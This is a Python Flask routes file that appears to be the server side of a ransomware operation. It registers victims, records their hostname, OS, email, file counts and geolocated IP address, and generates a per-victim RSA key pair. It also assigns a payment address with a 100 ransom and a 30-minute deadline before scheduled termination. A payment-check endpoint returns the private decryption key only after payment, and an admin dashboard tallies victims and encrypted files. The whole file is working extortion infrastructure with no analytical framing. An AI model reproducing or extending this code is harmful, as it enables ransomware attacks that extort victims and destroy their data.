from flask import render_template, request, redirect, url_for, flash, jsonify
from flask_login import login_user, current_user, login_required, logout_user
from application.models import *
from utilities.gen_rsa import gen_keys
import random, string
from app import login_manager, csrf, limiter
from werkzeug.security import check_password_hash
from application.forms import LoginForm
from application.models import Users, UsersPaid, UsersData
from utilities.get_ip import user_geolocation
from application.tasks import schedule_termination
import pytz


tz = pytz.timezone('America/Toronto')


@app.route("/new-user", methods=["POST"])
@csrf.exempt
def new_user():
    try:
        if 'HTTP_X_FORWARDED_FOR' in request.environ:
            user_ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
        else:
            user_ip = request.remote_addr

        geolocation = user_geolocation(user_ip)
        data = request.json

        existing_user = Users.query.filter_by(uid=data["UID"]).first()
        if existing_user:
            return jsonify({"error": "UID already exists."}), 400

        keys = gen_keys()
        expiration_date = datetime.now(tz=tz) + timedelta(minutes=30)

        user = Users(
            username=data.get("Username"),
            hostname=data.get("Hostname"),
            uid=data.get("UID"),
            os_name=data.get("OS"),
            os_version=data.get("Version"),
            os_architecture=data.get("Architecture"),
            email=data.get("User Email"),
            ip_address=user_ip,
            public_key=keys[1],
            private_key=keys[0],
            crypto_address=''.join(random.choices(string.ascii_letters + string.digits, k=16)),
            total_payment=100,
            status=False,
            amount_paid=0,
            creation_date=datetime.now(tz=tz),
            expiration=expiration_date
        )
        user_data = UsersData(
            uid=data.get("UID"),
            files=data.get("Files"),
            ip=geolocation.get("IP"),
            city=geolocation.get("city"),
            region=geolocation.get("region"),
            country=geolocation.get("country"),
            postal=geolocation.get("postal"),
            latitude=geolocation.get("latitude"),
            longitude=geolocation.get("longitude"),
        )
        db.session.add(user)
        db.session.add(user_data)
        db.session.commit()

        schedule_termination(user.id, expiration_date)

        return jsonify({"message": "User and keys added successfully."}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/check-payment", methods=["POST"])
@csrf.exempt
@limiter.limit("2 per 1 hour")
def check_payment():
    try:
        data = request.json
        uid = data.get('uid') if data else None
        if not uid:
            return jsonify({"error": "Request failed."}), 400

        paid_user = UsersPaid.query.filter_by(uid=uid).first()
        if paid_user and paid_user.status:
            return jsonify({
                "STATUS": "SUCCESS",
                "PRIVATE_KEY": str(paid_user.private_key)
            }), 200
        else:
            return jsonify({"error": "Payment not yet complete."}), 400

    except Exception as e:
        return jsonify({"error": "Request failed, try again."}), 400


@login_manager.user_loader
def load_user(user_id):
    return Administrator.query.get(int(user_id))


@app.route("/login", methods=["GET", "POST"])
def login():
    form = LoginForm()
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        remember = True if request.form.get("remember_me") else False

        user = Administrator.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            login_user(user, remember=remember)
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password.', 'danger')

    return render_template("login.html", form=form)


@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


from sqlalchemy import func


@login_required
@app.route("/dashboard", methods=["GET"])
def dashboard():
    users_data = UsersData.query.all()
    max_files = max((user.files for user in users_data if user.files is not None), default=0)
    total_files = sum(user.files for user in users_data if user.files is not None)

    return render_template(
        "dashboard/dashboard.html",
        active_page='dashboard',
        users_data=users_data,
        max_files=max_files,
        total_files=total_files
    )


@login_required
@app.route("/databases", methods=["GET", "POST"])
def databases():
    users = Users.query.all()
    users_paid = UsersPaid.query.all()

    # Get counts and latest entry dates for Users table
    users_count = len(users)
    last_user_date = None
    if users_count > 0:
        last_user = Users.query.order_by(Users.creation_date.desc()).first()
        last_user_date = last_user.creation_date

    # Get counts and latest entry dates for UsersPaid table
    users_paid_count = len(users_paid)
    last_user_paid_date = None
    if users_paid_count > 0:
        last_user_paid = UsersPaid.query.order_by(UsersPaid.payment_date.desc()).first()
        last_user_paid_date = last_user_paid.payment_date

    return render_template(
        "dashboard/databases.html",
        active_page='databases',
        users=users,
        users_paid=users_paid,
        users_count=users_count,
        last_user_date=last_user_date,
        users_paid_count=users_paid_count,
        last_user_paid_date=last_user_paid_date
    )


@app.errorhandler(429)
def ratelimit_error(e):
    return jsonify({"status": "error", "message": "Too many requests. Please slow down."}), 429

#
